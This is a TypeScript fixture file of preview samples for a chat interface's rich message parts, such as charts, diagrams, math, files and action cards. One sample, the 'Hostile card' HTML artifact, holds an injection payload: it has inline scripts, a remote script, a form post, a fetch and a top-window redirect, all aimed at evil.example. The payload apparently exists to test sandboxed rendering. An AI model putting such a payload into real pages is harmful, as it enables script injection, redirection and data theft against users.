import type {
  ActionCardPart,
  BrowserFramePart,
  ChartPart,
  FilePartV2,
  HtmlArtifactPart,
  MathPart,
  MermaidPart,
  SystemEventPart,
} from '@/lib/chat/parts'
import type { RichMessagePart } from '@/lib/hermes/types'

export type ChatPartPreviewId =
  | 'chart'
  | 'mermaid'
  | 'math'
  | 'html_artifact'
  | 'file'
  | 'browser_frame'
  | 'system_event'
  | 'action_card'

export type ChatPartPreviewFixture = {
  id: ChatPartPreviewId
  title: string
  part: RichMessagePart
}

type TypedPreviewPart =
  | ChartPart
  | MermaidPart
  | MathPart
  | HtmlArtifactPart
  | FilePartV2
  | BrowserFramePart
  | SystemEventPart
  | ActionCardPart

function asPreviewPart(part: TypedPreviewPart): RichMessagePart {
  return { ...part } as RichMessagePart
}

const CHART: ChartPart = {
  type: 'chart',
  kind: 'bar',
  title: 'Pipeline',
  x: 'stage',
  series: [{ key: 'count', label: 'Deals' }],
  data: [
    { stage: 'Lead', count: 12 },
    { stage: 'Won', count: 4 },
  ],
}

const MERMAID: MermaidPart = {
  type: 'mermaid',
  title: 'Flow',
  source: 'flowchart LR\n  A[Client] --> B[Pip]',
}

const MATH: MathPart = {
  type: 'math',
  latex: 'E = mc^2',
  display: true,
}

const HTML_ARTIFACT: HtmlArtifactPart = {
  type: 'html_artifact',
  title: 'Hostile card',
  html: '<p>Visible</p><script>window.__pib_xss = 1</script><script src="https://evil.example/x.js"></script><form method="post" action="https://evil.example"><button>x</button></form><a target="_top" href="https://evil.example">leave</a><script>fetch(\'https://evil.example\'); window.top.location = \'https://evil.example\'</script>',
  height: 240,
}

const FILE: FilePartV2 = {
  type: 'file',
  url: 'https://cdn.example.com/report.csv',
  name: 'report.csv',
  contentType: 'text/csv',
  size: 128,
}

const BROWSER_FRAME: BrowserFramePart = {
  type: 'browser_frame',
  screenshotUrl: 'https://cdn.example.com/frame.png',
  url: 'https://example.com/app',
  sessionId: 'sess-golden-1',
}

const SYSTEM_EVENT: SystemEventPart = {
  type: 'system_event',
  eventKind: 'driver.hand_back',
  actorKind: 'user',
  actorLabel: 'Peet',
  summary: 'Handed the desktop back to Blake',
  at: '2026-09-04T09:00:00.000Z',
}

const ACTION_CARD: ActionCardPart = {
  type: 'action_card',
  kind: 'routine_run',
  title: 'Morning brief',
  detail: 'Posted the daily pipeline summary.',
  status: 'succeeded',
  url: 'https://partnersinbiz.online/messages/conv-1',
}

export const CHAT_PART_PREVIEW_FIXTURES: readonly ChatPartPreviewFixture[] = [
  { id: 'chart', title: 'Pipeline', part: asPreviewPart(CHART) },
  { id: 'mermaid', title: 'Flow', part: asPreviewPart(MERMAID) },
  { id: 'math', title: 'E = mc^2', part: asPreviewPart(MATH) },
  { id: 'html_artifact', title: 'Hostile card', part: asPreviewPart(HTML_ARTIFACT) },
  { id: 'file', title: 'report.csv', part: asPreviewPart(FILE) },
  { id: 'browser_frame', title: 'Browser frame', part: asPreviewPart(BROWSER_FRAME) },
  { id: 'system_event', title: 'Hand back', part: asPreviewPart(SYSTEM_EVENT) },
  { id: 'action_card', title: 'Routine run', part: asPreviewPart(ACTION_CARD) },
]
